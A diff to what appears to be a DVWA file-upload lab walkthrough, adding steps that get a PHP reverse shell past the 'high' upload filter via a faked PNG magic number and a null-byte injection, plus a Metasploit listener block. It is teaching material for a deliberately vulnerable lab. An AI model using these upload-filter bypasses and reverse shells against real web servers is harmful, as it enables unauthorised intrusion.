@@ -155,24 +155,24 @@ We can also use [`weevely3`](https://github.com/epinna/weevely3) to get a revers
 
 2. Upload the file:
 
-    ![](msfvenom_uploaded.png)
+    ![](msfvenom_uploaded.png){: width='75%'}
 
 3. Set up the a listener within `msfconsole`:
 
-```shell
-msfconsole -q
-msf6 > use exploit/multi/handler
-[*] Using configured payload generic/shell_reverse_tcp
-msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
-payload => php/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > set lhost 127.0.0.1
-lhost => 127.0.0.1
-msf6 exploit(multi/handler) >
-msf6 exploit(multi/handler) > run
+    ```shell
+    msfconsole -q
+    msf6 > use exploit/multi/handler
+    [*] Using configured payload generic/shell_reverse_tcp
+    msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
+    payload => php/meterpreter/reverse_tcp
+    msf6 exploit(multi/handler) > set lhost 127.0.0.1
+    lhost => 127.0.0.1
+    msf6 exploit(multi/handler) >
+    msf6 exploit(multi/handler) > run
 
-[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
-[*] Started reverse TCP handler on 127.0.0.1:4444
-```
+    [!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+    [*] Started reverse TCP handler on 127.0.0.1:4444
+    ```
 
 4. Call the uploaded `msfvenom` payload:
 
@@ -193,7 +193,7 @@ msf6 exploit(multi/handler) > run
     meterpreter >
     ```
 
-6. As an extra step, we could then use one of the MSF's post-exploitation modules, such as the [Local Exploit Suggester](https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/), to check our options for lateral movement, privilege escalation, crendential gathering, etc.
+6. As an extra step, we could use one of the MSF's post-exploitation modules, such as the [Local Exploit Suggester](https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/), to check our options for lateral movement, privilege escalation, crendential gathering, etc.:
 
     ```shell
     meterpreter > bg
@@ -314,10 +314,72 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 ?> 
 ```
 
+1. Just changing the MIME type won't work this time because this time it is also checking the file extension:
+
+    ![](high_mime_failed.png)
+
+2. If we try to match the extension by renaming the `revshell.php` file to `revshell.png` file, we will find that it will fail again as it is also check the file's contents:
+
+    ```shell
+    # changing file's extension
+    cp revshell.php revshell.png
+    ```
+
+    ![](high_mime_ext_failed.png)
+
+3. One way of bypassing this is by changing the file's [Magic Number](https://en.wikipedia.org/wiki/List_of_file_signatures). We must first find out what that number is for `.png` files:
+
+    ![](png_mn.png)
+
+4. We can see that this is 8 bits long, so we will edit the `revshell.png` file and add 8 random bits at the very beginning of the file:
+
+    ![](random_bits.png)
+
+5. We will then change these bits to the `.png`'s magic number hexadecimal values:
+
+    ```shell
+    hexeditor revshell.png
+    ```
+
+    ![](hexeditor_41.png)
+
+    ![](hexeditor_png.png)
+
+6. Upload the file to the webserver:
+
+    ![](upload_success.png)
+
+    ![](upload_success_browser.png)
+
+7. If we try to catch the reverse shell as it is, it won't work:
+
+    ![](high_revshell_fail.png)
+
+8. We need a way to get the file to be executed as `.php` but also keep the `.png` extension so we can upload it. This can be done by first renaming it once again:
+
+    ```shell
+    # changing file's extension
+    cp revshell.png revshell.php.png
+    ```
+
+9. Then intercept the traffic while uploading the file and inject a [null byte](https://www.thehacker.recipes/web/inputs/null-byte-injection) (`%00`) after the `.php` extension before sending the request:
+
+    ![](high_pre_null_byte.png)
+
+    ![](high_shell_null.png)
+
+
+10. If you try to call it by just visiting the give path it won't work:
+
+    ![](high_revshell_null_fail.png)
+
+11. However, if you remove everything after `.php` it should send a reverse shell back:
+
+    ![](high_revshell_null_success.png)
 
 ## Security: Impossible
 
-> _This will check everything from all the levels so far, as well then to re-encode the image. This will make a new image, therefor stripping any "non-image" code (including metadata)._
+> _This will check everything from all the levels so far, as well then to re-encode the image. This will make a new image, therefore stripping any "non-image" code (including metadata)._
 
 ```php
 # source code for impossible security
